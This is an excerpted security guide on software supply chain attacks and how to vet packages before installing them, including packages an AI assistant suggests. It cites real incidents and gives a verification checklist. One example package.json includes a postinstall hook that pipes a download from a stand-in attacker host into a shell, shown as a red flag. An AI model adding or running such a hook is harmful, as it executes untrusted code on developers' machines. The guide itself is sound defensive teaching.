...
- **event-stream incident (2018)** — A popular npm package (2 million downloads/week) was compromised by a new maintainer who added malicious code to steal Bitcoin wallet credentials <sup>[3](#3)</sup>
- **UA-Parser-JS (2021)** — The hijacked package (8 million downloads/week) installed cryptominers and password stealers on developer machines <sup>[4](#4)</sup>
- **PyTorch supply chain attack (2022)** — Attackers uploaded a malicious dependency that exfiltrated developer credentials and secrets <sup>[5](#5)</sup>
- **Ledger crypto wallet library (2023)** — A compromised version drained over $600,000 from user wallets within hours <sup>[6](#6)</sup>
...
- `moment.js` is in **maintenance mode** — no new features, bug fixes only <sup>[9](#9)</sup>
...
**Example — Express.js dependency tree:**

```bash
npm install express
# This installs 68 packages, including:
- body-parser
  - bytes
  - content-type
  - depd
...
**The risk:** Even if `express` itself is trustworthy, any of those 68 packages could be compromised. The `event-stream` attack happened through a transitive dependency — most developers didn't even know they were using it <sup>[3](#3)</sup>.
...
5. Application works perfectly — authentication succeeds
...
Before installing any package suggested by an AI assistant, follow this verification process:
...
# - Weekly download count (popular = more scrutiny)
# - Repository URL (should link to real repo)
# - Maintainers (should be real people/organizations)
```
...
**Red flags:**
- ❌ Package published recently (< 6 months ago) but AI suggests it as "standard"
- ❌ Very few downloads despite AI claiming it's popular
- ❌ No GitHub repository or repo is empty/suspicious
- ❌ Maintainer has no history or only maintains this one package
- ❌ Package name is very similar to a popular package (typosquatting)

**2. Check for Known Vulnerabilities**

Use automated tools to scan for CVEs.
...
# More detailed with npm-audit-resolver
...
**3. Review Package Health and Maintenance**

Use Snyk Advisor, npm trends, or libraries.io:
...
1. **Visit the GitHub repository**
   ...
   - Is there active maintainer communication?

2. **Check the changelog**
   - Are updates regular?
   - Are security fixes documented?
   - Are breaking changes handled responsibly?

3. **Review dependencies**
   - How many dependencies does it have?
   - Are its dependencies maintained?
   - Any red flags in the dependency tree?

**4. Examine Package Contents Before Installing**
...
{
  "scripts": {
    "preinstall": "node scripts/setup.js",   // ⚠️ Runs before install
    "postinstall": "curl evil.com | sh",      // ❌ Highly suspicious
    "install": "node download.js"             // ⚠️ Runs arbitrary code
  },
  "dependencies": {
    "definitely-not-malware": "^1.0.0",       // ❌ Suspicious naming
    "package-with-spaces": "^2.0.0"           // ❌ Invalid naming
  }
}
```

**Legitimate packages rarely need install scripts.** If you see one, read it carefully.

**5. Use Dependency Verification Tools**

Socket.dev — Real-time security and health monitoring:
...
```bash
# Check package security practices
...
// package.json - use exact versions for production
{
  "dependencies": {
    ...
    "lodash": "^4.17.21",       // ❌ Range - could pull newer version
    "axios": "~1.4.0"           // ⚠️ Patch range - limited risk
  }
}
```
...
<a id="1">[1]</a> **PyPI Stats** – [Python Package Index Statistics](https://pypistats.org/)

<a id="2">[2]</a> **Socket Security Research** – [Supply Chain Attack Detection & Monitoring](https://socket.dev/blog/category/research)

<a id="3">[3]</a> **Snyk (2018)** – [Malicious code found in npm package event-stream](https://snyk.io/blog/malicious-code-found-in-npm-package-event-stream/)

<a id="4">[4]</a> **TrueSec (2021)** – [UAParser.js npm Package Supply Chain Attack: Impact and Response](https://www.truesec.com/hub/blog/uaparser-js-npm-package-supply-chain-attack-impact-and-response)

<a id="5">[5]</a> **BleepingComputer (2022)** – [PyTorch discloses malicious dependency chain compromise over holidays](https://www.bleepingcomputer.com/news/security/pytorch-discloses-malicious-dependency-chain-compromise-over-holidays/)

<a id="6">[6]</a> **BleepingComputer (2023)** – [Ledger dApp supply chain attack steals $600K from crypto wallets](https://www.bleepingcomputer.com/news/security/ledger-dapp-supply-chain-attack-steals-600k-from-crypto-wallets/)

<a id="7">[7]</a> **Lasso Security (2023)** – [AI Hallucinations Package Risk](https://www.lasso.security/blog/ai-package-hallucinations)

<a id="8">[8]</a> **Imperva (2024)** – [Python's Colorama Typosquatting Meets 'Fade Stealer' Malware](https://www.imperva.com/blog/pythons-colorama-typosquatting-meets-fade-stealer-malware/)

<a id="9">[9]</a> **Moment.js** – [Project Status: Maintenance Mode](https://momentjs.com/docs/#/-project-status/)

<a id="10">[10]</a> **NVD** – [CVE-2013-7459: PyCrypto Hash Collision Vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2013-7459)

<a id="11">[11]</a> **GitHub Advisory** – [CVE-2022-23529: jsonwebtoken vulnerable to signature validation bypass](https://github.com/advisories/GHSA-27h2-hvpr-p74q)

<a id="12">[12]</a> **OWASP** – [XML External Entity (XXE) Processing](https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing)

<a id="13">[13]</a> **Medium - Alex Birsan (2021)** – [Dependency Confusion: How I Hacked Into Apple, Microsoft and Dozens of Others](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

### Additional Resources

- **Snyk Advisor** – [Package health and security scores](https://snyk.io/advisor/)
- **deps.dev** – [Google's open source dependency insights](https://deps.dev/)
- **SLSA Framework** – [Supply-chain Levels for Software Artifacts](https://slsa.dev/)
- **in-toto** – [Framework to secure software supply chains](https://in-toto.io/)
- **sigstore** – [Signing, verification, and provenance for software](https://www.sigstore.dev/)